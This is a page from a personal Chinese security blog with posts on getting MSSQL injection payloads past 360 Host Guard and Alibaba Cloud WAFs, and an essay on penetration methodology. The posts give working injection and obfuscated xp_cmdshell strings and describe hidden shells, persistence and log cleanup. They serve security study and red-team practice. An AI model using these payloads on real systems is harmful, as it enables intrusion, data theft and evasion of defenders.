<h1 id="绕过过程"><a href="#绕过过程" class="headerlink" title="绕过过程"></a>绕过过程</h1><h2 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h2><p>这个之前bypass写过，我这次测试的目标同样是可以使用参数污染来进行绕过的，会出现这个问题，是因为360主机卫士在处理post请求时，没有处理post请求中的get参数，所以可以使用这种方式来进行全局绕过。</p>
<p><img src="/2020/07/26/MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87360%E4%B8%BB%E6%9C%BA%E5%8D%AB%E5%A3%AB/image-20200726165735149.png" alt="image-20200726165735149"></p>
<h2 id="静态资源白名单"><a href="#静态资源白名单" class="headerlink" title="静态资源白名单"></a>静态资源白名单</h2><p>之前我自己也经过测试，在php+apache或aspx+iis的站上，加静态后缀是不会影响程序的正常解析。同时，这个也能绕过安全卫士</p>
<p><img src="/2020/07/26/MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87360%E4%B8%BB%E6%9C%BA%E5%8D%AB%E5%A3%AB/image-20200726170717888.png" alt="image-20200726170717888"></p>
<h2 id="改变请求为multipart-form-data"><a href="#改变请求为multipart-form-data" class="headerlink" title="改变请求为multipart/form-data"></a>改变请求为multipart/form-data</h2><p>这个方法直接使用是绕不过的，不过可以配合数据填充的方法进行绕过</p>
<p><img src="/2020/07/26/MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87360%E4%B8%BB%E6%9C%BA%E5%8D%AB%E5%A3%AB/image-20200726171115095.png" alt="image-20200726171115095"></p>
<h2 id="语义上的绕过"><a href="#语义上的绕过" class="headerlink" title="语义上的绕过"></a>语义上的绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">上面的绕过是全局绕过的方法，下面我们回归到正常语句的绕过</span><br></pre></td></tr></table></figure>

<p>现在我们要测试多语句，需要使用waitfor delay来进行判断，我们知道，很多waf在遇到%00是会忽略后面的语句的，但是在ASPX+IIS的环境中，并不会影响正常解析，我们尝试使用这个特性绕过。</p>
<p><img src="/2020/07/26/MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87360%E4%B8%BB%E6%9C%BA%E5%8D%AB%E5%A3%AB/image-20200726180930445.png" alt="image-20200726180930445"></p>
<p><strong>DNS外带</strong></p>
<p>我们再测试能否绕过WAF发起DNS请求，首先我还是使用%00代替空格，但是这里是绕不过的</p>
<p><img src="/2020/07/26/MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87360%E4%B8%BB%E6%9C%BA%E5%8D%AB%E5%A3%AB/image-20200726194613652.png" alt="image-20200726194613652"></p>
<p>这里的拦截一般就是exec和xp_dirtree的拦截，首先我测试在exec和xp_dirtree之间，能否又什么字符可以绕过，这里可以使用换行加注释进行绕过。</p>
<p><img src="/2020/07/26/MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87360%E4%B8%BB%E6%9C%BA%E5%8D%AB%E5%A3%AB/image-20200726200253396.png" alt="image-20200726200253396"></p>
<p>exec和xp_dirtree之间的空格也可以使用空白字符，我测了%11绕不过去，也可以fuzz一下，不过这个站速度挺慢的，这里就简单提供一个思路。针对aspx的站，虽然也可以使用unicode编码，不过使用的比较受限，这里测试了字符e的unicode编码%004e，是绕不过去的。</p>
<p><strong>命令执行</strong></p>
<p>也可以使用–xxx%0a这样的语法进行绕过。</p>
<p><img src="/2020/07/26/MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87360%E4%B8%BB%E6%9C%BA%E5%8D%AB%E5%A3%AB/image-20200726212927798.png" alt="image-20200726212927798"></p>
<p>其实也有其他的绕过方式，比如通过exec函数来执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exec(&#39;x&#39;+&#39;p_c&#39;+&#39;mds&#39;+&#39;hell &#39;&#39;whoami&#39;&#39;&#39;)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/26/MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87360%E4%B8%BB%E6%9C%BA%E5%8D%AB%E5%A3%AB/image-20200726213916436.png" alt="image-20200726213916436"></p>
<p>或者通过变量定义的方式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @test nvarchar(50) set @test&#x3D;&#39;e&#39;+&#39;x&#39;+&#39;e&#39;+&#39;c x&#39;+&#39;p_&#39;+&#39;c&#39;+&#39;mdshell &#39;&#39;whoami&#39;&#39;&#39; exec--%0asp_executesql @test--</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/26/MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87360%E4%B8%BB%E6%9C%BA%E5%8D%AB%E5%A3%AB/image-20200726214833741.png" alt="image-20200726214833741"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p> 在进行WAF绕过时，其实我认为最好还是先去测那种通用绕过方案，比如参数污染，静态资源白名单，改变请求类型，因为这样可以全局绕过WAF，又能最少的触发拦截规则，如果要手动去根据规则绕的话，难免某些语句会触发拦截规则，如果在某些红蓝对抗的项目中，不就被发现了。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/" class="post-title-link" itemprop="url">记MSSQL绕过阿里云</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-07-26 11:17:07" itemprop="dateCreated datePublished" datetime="2020-07-26T11:17:07+08:00">2020-07-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-07-29 17:00:04" itemprop="dateModified" datetime="2020-07-29T17:00:04+08:00">2020-07-29</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">最近一直在学习关于WAF绕过的知识，本次选择阿里云这款云WAF来测试关于MSSQL注入的绕过。因为阿里云主站可能不</span><br><span class="line">是ASP+IIS的环境，所以我不清楚如果真的是ASP+IIS的环境，阿里云的拦截规则是否会有相应的变化。</span><br></pre></td></tr></table></figure>

<h2 id="绕过过程"><a href="#绕过过程" class="headerlink" title="绕过过程"></a>绕过过程</h2><h3 id="逻辑判断语句绕过"><a href="#逻辑判断语句绕过" class="headerlink" title="逻辑判断语句绕过"></a>逻辑判断语句绕过</h3><p>我们知道在检测一个注入点的时候，首先会加上and 1=1之类的判断语句，如果页面返回的逻辑符合我们设想的逻辑，那么就有可能有注入。</p>
<p><strong>利用%特性绕过</strong></p>
<p>在iis+asp的环境中，在关键字中间加%不会影响程序的正常执行，因此可以在关键字and中添加%来绕过阿里云的检测。</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726131616934.png" alt="image-20200726131616934"></p>
<p><strong>利用unicode编码绕过</strong></p>
<p>在ASP+IIS环境中，有某些特性的字符可能会有多个unicode编码，因此可以通过对关键字进行unicode编码进行绕过，比如字符A有多个unicode编码，使用%u0061，%u0041等可能无法绕过，但是使用%u00AA则可以绕过。</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726132202139.png" alt="image-20200726132202139"></p>
<p><strong>参数污染</strong></p>
<p>同样，我们也可以使用参数污染来绕过阿里云的检测，可能阿里云这种云WAF在设计上没有考虑到容器特性导致的绕过，只是适配于大多数网站的一般防护。</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726132416572.png" alt="image-20200726132416572"></p>
<h3 id="绕过order-by拦截"><a href="#绕过order-by拦截" class="headerlink" title="绕过order by拦截"></a>绕过order by拦截</h3><p>阿里云对order by的拦截比较奇怪，如果order by后面跟的是个字符，则不会拦截，跟的是数字就会拦截，因此我们可以这样构造,order by “a”,1</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726133941676.png" alt="image-20200726133941676"></p>
<p>上面是针对阿里云拦截的通用绕过方法，我们也可以结合asp的特性来进行绕过，比如%,参数污染等等</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726134347117.png" alt="image-20200726134347117"></p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726134426821.png" alt="image-20200726134426821"></p>
<p>换行+注释，这里阿里云是这样的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--%0a 不拦截，这个是mssql的注释+换行</span><br><span class="line">--+%0a 拦截，mysql注释+换行</span><br></pre></td></tr></table></figure>

<p>这就可以说明阿里云这款云WAF的主要拦截规则是为mysql设计的，至少在edu.aliyun.com这个站是这样的，至于其他的网站，我没有找到用阿里云的asp的站，所以没有测试。</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726134723900.png" alt="image-20200726134723900"></p>
<h3 id="联合注入绕过"><a href="#联合注入绕过" class="headerlink" title="联合注入绕过"></a>联合注入绕过</h3><p>在ASP+IIS的环境中，%11等也可以代替空白字符，这个阿里云也没有考虑到，因此也可以达到绕过的目的。</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726135438964.png" alt="image-20200726135438964"></p>
<p>至于union和select之后的其他字符，并不会被拦截</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726135841710.png" alt="image-20200726135841710"></p>
<p>假如现在要通过union注入获取数据，比如version，数据库等等，我们看下怎么绕过。</p>
<h4 id="获取版本信息"><a href="#获取版本信息" class="headerlink" title="获取版本信息"></a>获取版本信息</h4><p>比如获取version，直接使用version关键字是不拦的，只有使用@@version时才会拦截。而且单独的@@version也是会被阿里云拦截的</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726140854413.png" alt="image-20200726140854413"></p>
<p>所以这里要绕过的话，就是要想办法破坏@@version这个关键字，方法也挺多的。</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726140950076.png" alt="image-20200726140950076"></p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726141003116.png" alt="image-20200726141003116"></p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726141022204.png" alt="image-20200726141022204"></p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726141048780.png" alt="image-20200726141048780"></p>
<h4 id="获取数据库"><a href="#获取数据库" class="headerlink" title="获取数据库"></a>获取数据库</h4><p>使用db_name()获取数据库，这个直接没有拦截，没什么好说的</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726141206749.png" alt="image-20200726141206749"></p>
<p>获取其他的数据库，源语句如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select null,null,null,name from master..sysdatabases where name not in(&#39;master&#39;)</span><br></pre></td></tr></table></figure>

<p>前面union select的绕过方法不变，这里我测试过程中发现当我使用master..sysdatabases会被阿里云拦截。</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726141611877.png" alt="image-20200726141611877"></p>
<p>但是master..sysdatabases单独出现并不会被拦截，因此绕过的思路有两种，第一种是破坏master..sysdatabases出现的上下文环境，另一种就是就是对这个关键字自身做一些操作。</p>
<p><strong>方法一：参数污染</strong></p>
<p>使用这种方式进行处理，就是破坏这个关键字出现的上下问环境</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726142000412.png" alt="image-20200726142000412"></p>
<p><strong>方法二：破坏关键字本身</strong></p>
<p>这里阿里云是将master..sysdatabases整体当作一个拦截规则进行拦截的，因此我们可以破坏这个关键字本身来达到绕过的目的。</p>
<p>注释+换行，在.中间加上注释和换行不会影响程序的正常解析，但是却可以绕过阿里云</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726142708993.png" alt="image-20200726142708993"></p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726142729333.png" alt="image-20200726142729333"></p>
<p>当然，我们也可以使用unicode编码</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726142856285.png" alt="image-20200726142856285"></p>
<h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><p>这个阿里云不拦截，因此没什么好说的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union--xxxx%0aselect null,null,null,name from 数据库名..sysobjects  where xtype&#x3D;&#39;U&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726143029949.png" alt="image-20200726143029949"></p>
<h4 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union--xxxx%0aselect null,null,null,name from%11sysobjects  where id&#x3D;(select id </span><br><span class="line">from sysobjects WHERE name &#x3D; &#39;表名&#39;)</span><br></pre></td></tr></table></figure>

<p>这里阿里云拦截了select id from这部分，但是单独的select id from是不会拦截的，所以我们要把这个语句放在上下问环境下来测试绕过。首先我发现select xxx也是会被拦截的，我在select中假如了%达到了此处的绕过。</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726144229258.png" alt="image-20200726144229258"></p>
<p>后面的部分也就不会拦截了,所以绕过语句如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union--xxxx%0aselect null,null,null,name from%11sysobjects where id&#x3D;(sele%ct id from sysobjects where name&#x3D;&#39;x&#39;)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726145119306.png" alt="image-20200726145119306"></p>
<h4 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h4><p>这个没啥说的，本身就可以直接绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union--xxxx%0aselect null,null,null,name from%11数据库..表名</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726145308997.png" alt="image-20200726145308997"></p>
<h3 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h3><p>很多时候我们拿到MSSQL的注入，可能是直接执行命令而不是出数据，对吧？</p>
<p>首先是不是要判断能不能执行多语句，我最常用的是waitfor delay ’00：00：05‘这样的语句来判断是否支持多语句，所以我们首先看下怎么使用这个语句绕过阿里云。</p>
<p>这里讲一下，我在对WAF进行绕过测试的思路。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">首先，我要判断出这个WAF的拦截规则，比如waitfor delay ’00：00：05‘，这个直接会被阿里云拦的,所以我要</span><br><span class="line">判断是那部分被阿里云拦了。这里的绕过测试其实和免杀的方法类似，就是特征码定位，比如，我删除了delay后面的</span><br><span class="line">部分，还是会被拦，因此&#39;00:00:05&#39;并不是WAF拦截的部分，我再删除了delay发现不烂了，因此，可能拦截的就</span><br><span class="line">是waitfor delay这个关键字。</span><br></pre></td></tr></table></figure>

<p><strong>绕过一：unicode编码</strong></p>
<p>通过之前的测试，我们知道关键字a的unicode编码是没有被阿里云拦截的，因此我们可以通过unicode编码绕过。</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726150126019.png" alt="image-20200726150126019"></p>
<p><strong>绕过二：空白字符</strong></p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726150214566.png" alt="image-20200726150214566"></p>
<p><strong>绕过三：注释+换行</strong></p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726150252014.png" alt="image-20200726150252014"></p>
<p>然后假如我们要调用xp_cmdshell执行命令，该怎么绕过。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;whoami&#39;</span><br></pre></td></tr></table></figure>

<p>这里我经过测试，发现当exec和 master..xp_cmdshell一起出现时，则会被拦截，因此绕过一方面时破坏exec和master..xp_cmdshell中间的内容，还有就是master..xpcmdshell本身。可能是这个比较重要，我这里发现，当</p>
<p>exec 和xp_cmdshell同时出现，不管中间是什么字符，都会被拦截。</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726150806727.png" alt="image-20200726150806727"></p>
<p><strong>绕过一：参数污染</strong></p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726150914069.png" alt="image-20200726150914069"></p>
<p><strong>绕过二：%</strong></p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726150953254.png" alt="image-20200726150953254"></p>
<p><strong>绕过三：unicode编码</strong></p>
<p>我这里找了个e的unicode编码进行绕过</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726151055989.png" alt="image-20200726151055989"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    其实这些方法在几年前都有很多大佬总结过，我也不过是按照他们提供的思路进行尝试，这里会发现云WAF的一个问题，就是他们针对于mysql拦截的比较全面，但是对于其他的数据库，可能没有那么全面。还有一些针对于容器的绕过方法，比如参数污染，%,甚至在aspx中还有%00特性也没有考虑到，当然，这个也有可能是因为我测试的这个站不是用的ASP+IIS的环境，才能让我顺利绕过。总之，WAF也是人写的，并没有那么可怕。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/07/20/%E6%88%91%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B7%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/07/20/%E6%88%91%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B7%AF/" class="post-title-link" itemprop="url">我的渗透之路</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2020-07-20 20:09:15 / Modified: 21:19:43" itemprop="dateCreated datePublished" datetime="2020-07-20T20:09:15+08:00">2020-07-20</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不加检点的人生不值一过。</span><br></pre></td></tr></table></figure>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    最近可能是因为技术处于一个瓶颈期，又或者说对未来技术发展方向有些迷茫，所以写下这篇文章梳理一下当前自身的技能树以及未来的发展方向。</p>
<h2 id="我的渗透观"><a href="#我的渗透观" class="headerlink" title="我的渗透观"></a>我的渗透观</h2><p>​    根据我自己对于渗透的理解，把渗透分为如下几个步骤：</p>
<p><strong>信息搜集</strong></p>
<p>​    这里的信息搜集不仅仅局限于对于目标开放的web资产的情况进行搜集，也可以是人员信息，一些历史漏洞，或者信息泄露的收集，总之一些有利于我们对目标系统进行攻击的信息都可以是我们收集的范围之内。在信息搜集的过程中，我们需要根据自己搜集的结果分析目标可能比较脆弱的点，比如一些VPN,OA,邮件系统或者说是企业内部自用的一些系统。对于这些系统的攻击，我们除了可以猜弱口令或爆破外，也可以去通过钓鱼，信息泄露或者其他途径获取的密码去获得这些系统的访问权限。又或者说有一些比较知名并且非常方便去利用的RCE，比如Weblogic，Shior，Thinkphp,Struts2等等，目标哪些系统使用了这些框架也是我们在信息搜集过程中要做的。</p>
<p>​    总之，我认为渗透的信息搜集不仅仅是包含了资产收集的步骤，还应该包含目标分析的步骤，这个阶段的结果对我们来说尤其重要，直接决定了我们后续活动的重心，因此，我认为在这个阶段我们可以花费较多的时间去搜集、整理、分析、筛选目标。</p>
<p><strong>漏洞挖掘</strong></p>
<p>​    同样，这里的漏洞挖掘并非狭义的指一些web漏洞的挖掘，而是目标整个防御体系的缺陷，任何有可能帮助我们突破目标防御的点都值得我们去深入挖掘。这个步骤我们需要注意的就是明确目标，我们所挖掘的任何信息或者漏洞目的只有一个，为了帮助我们获取目标的一个根据点，不要花费精力去挖一些对于本次活动没什么帮助的漏洞。</p>
<p>​    就我个人来讲，我不是很喜欢这个过程，可能因为我很少挖到那种比较开脑洞的漏洞，让我觉得挖洞是一个体力活，相比漏洞挖掘，我更喜欢下一个过程。</p>
<p><strong>漏洞利用</strong></p>
<p>​    这个过程的目的就是通过我们前面这些步骤操作所挖掘到系统存在的问题，然后通过一些组合利用，让我们获取一个进入目标内网的一个口子，也可以说是突破目标边界。</p>
<p>​    为什么我喜欢这个过程，因为我喜欢了解漏洞的原理，而且在漏洞利用这个过程我认为比较有趣，尤其是遇到各种拦截，需要我们通过自己的知识去bypass，还有就是因为可能目标环境的问题影响，可能导致虽然是同一种漏洞，但是利用的方法都不太一样。</p>
<p>​    通过漏洞的组合利用，我们最终构建了一个进入目标内网的通道，这个通道可以是一个反弹shell,一个马，一个http隧道，socks隧道。</p>
<p><strong>内网信息搜集</strong></p>
<p>​    当我们进入内网后，我们可能对目标内网是一无所知的，也不知道我们最终的目标在哪里，所以需要进行各种信息搜集，搜集这些信息的目的，主要还是为了定位目标的地址，构建一个从我们至目标的一个可达的途径。主要搜集的一个是目标内网的一个拓扑，通过这个拓扑我们就可以知道目标在哪个位置，还有一个就是目标内网的各种主机和服务的密码，很多时候，我们渗透内网的方式非常的简单粗暴，就是不停的搜集资产，抓密码，撞密码的过程。</p>
<p>​    因为在某些活动中，我们获取一个内网权限来之不易，为了防止我们在操作的过程中被发现导致权限丢掉了，我认为在内网信息搜集前，应该先想办法去巩固我们的权限，比如多种几个隐秘的shell，还有就是对当前主机的一个权限维持。</p>
<p><strong>内网横向渗透</strong></p>
<p>​    关于内网横向渗透，我认为这个过程和漏洞挖掘的过程类似，就是一定要明确我们的目标，假如我们的目的只是内网中的某一个系统，那么去打一圈，控很多系统对我们实际是没有用的，我认为在内网渗透，应该尽量减少我们不必要的操作，因为我们每个操作都有可能给对方留下日志，增加了被发现的风险。</p>
<p>​    单纯从控更多主机来看的话，首选是通过主机密码去撞，现在还是有很多内网使用通用密码的，其次是通过各种服务的弱口令去搞，比如MSSQL，redis等，这些服务也比较容易帮助我们获取主机权限。再次，就是通过各种高危的web服务，weblogic,struts2等等去搞，最后再去搞目标的其他内网的系统。</p>
<p>​    也有一种思路就是去针对指定用户比如科技部，信息安全部的内网的邮件，oa系统进行攻击，这些人员可能有内网的各种系统的账号密码，如果能控这个人员的个人机也是非常不错的。</p>
<p><strong>最后</strong></p>
<p>​    为什么直接到最后了，经过内网的横向渗透，我们可能已经拿到了我们想要的目标，这时剩下的操作就是两个，一个是权限维持，另一个是痕迹清理，根据自己的需要执行对应的操作就可以了。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

  </div>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let activeClass = CONFIG.comments.activeClass;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">藏青</p>
  <div class="site-description" itemprop="description">知行合一</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">31</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; 
